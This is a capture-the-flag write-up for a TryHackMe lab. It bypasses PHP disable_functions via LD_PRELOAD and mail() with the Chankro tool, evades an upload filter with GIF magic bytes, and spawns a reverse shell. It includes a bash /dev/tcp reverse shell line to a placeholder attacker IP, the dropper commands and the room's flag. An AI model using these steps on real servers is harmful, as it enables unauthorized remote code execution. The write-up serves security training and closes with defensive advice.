# TryHackMe — Bypass Disable Functions

**Room:** [Bypass Disable Functions](https://tryhackme.com/room/bypassdisablefunctions)  
**Difficulty:** Info  
**Tags:** Web, File Upload, PHP, LD_PRELOAD  

---

## Objective

Compromise the machine by bypassing PHP `disable_functions` restrictions and locate `flag.txt`.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 10.65.148.7
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Two open ports: SSH (22) and HTTP (80).

### Directory Enumeration

```bash
gobuster dir -u http://10.65.148.7 -w /usr/share/wordlists/dirb/common.txt -x php
```

Key findings:

| Path           | Description                  |
|----------------|------------------------------|
| `/cv.php`      | File upload form             |
| `/uploads/`    | Upload destination directory |
| `/phpinfo.php` | PHP configuration info       |

---

## Enumeration

### Analyzing phpinfo.php

```bash
curl -s http://10.65.148.7/phpinfo.php | grep -i "disable_functions"
```

**Disabled functions:**

```
exec, passthru, shell_exec, system, proc_open, popen, curl_exec,
curl_multi_exec, parse_ini_file, pcntl_alarm, pcntl_fork, ...
```

All standard command execution functions are blocked.

**Key observations from phpinfo:**

| Parameter       | Value                                              |
|-----------------|----------------------------------------------------|
| `DOCUMENT_ROOT` | `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`   |
| `sendmail_path` | `/usr/sbin/sendmail -t -i`                         |
| `mail()`        | Available (not in `disable_functions`)              |
| `putenv()`      | Available (not in `disable_functions`)              |

Since `putenv()` and `mail()` are both available, we can use the **LD_PRELOAD bypass technique**.

---

## Exploitation

### Attack Vector: LD_PRELOAD + mail()

The idea behind this bypass:

1. `putenv()` sets the `LD_PRELOAD` environment variable to point to a malicious shared object (`.so`) file.
2. `mail()` calls `/usr/sbin/sendmail`, which is an external binary.
3. When `sendmail` executes, the dynamic linker loads our `.so` library **before** any other libraries.
4. The `.so` runs our payload (reverse shell) **outside** of PHP's `disable_functions` sandbox.

### Step 1 — Prepare Reverse Shell

```bash
cat > rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF
```

### Step 2 — Generate Payload with Chankro

[Chankro](https://github.com/TarlogicSecurity/Chankro) automates the LD_PRELOAD bypass by generating a PHP dropper that writes the `.so` library and payload to disk, then triggers execution via `mail()`.

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --arch 64 --input ../rev.sh --output ../backdoor.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

### Step 3 — Bypass Upload Filter

The upload form on `cv.php` checks for image file types. Adding a GIF magic byte header tricks the filter:

```bash
sed -i '1s/^/GIF89a;\n/' backdoor.php
```

### Step 4 — Upload and Trigger

1. Start a listener:

```bash
nc -lvnp 4444
```

2. Upload `backdoor.php` via the form at `http://10.65.148.7/cv.php`.

3. Trigger the payload:

```
http://10.65.148.7/uploads/backdoor.php
```

### Step 5 — Shell as www-data

```bash
www-data@ubuntu$ whoami
www-data
```

---

## Post-Exploitation

### Finding the Flag

```bash
www-data@ubuntu$ find / -name "*.txt" -readable 2>/dev/null | grep -i flag
/home/s4vi/flag.txt

www-data@ubuntu$ cat /home/s4vi/flag.txt
thm{bypass_d1sable_functions_1n_php}
```

---

## Flag

```
thm{bypass_d1sable_functions_1n_php}
```

---

## Key Takeaways

- **`disable_functions` is not a security boundary.** If `putenv()` and `mail()` (or other functions that invoke external binaries) remain available, the restriction can be bypassed via `LD_PRELOAD`.
- **File upload filters based on magic bytes are trivially bypassed** by prepending the expected header (e.g., `GIF89a;`) to a malicious file.
- **Defense in depth matters.** To properly restrict PHP execution: disable `putenv()`, restrict `LD_PRELOAD` at the OS level, use `open_basedir`, and run PHP in a containerized or sandboxed environment.
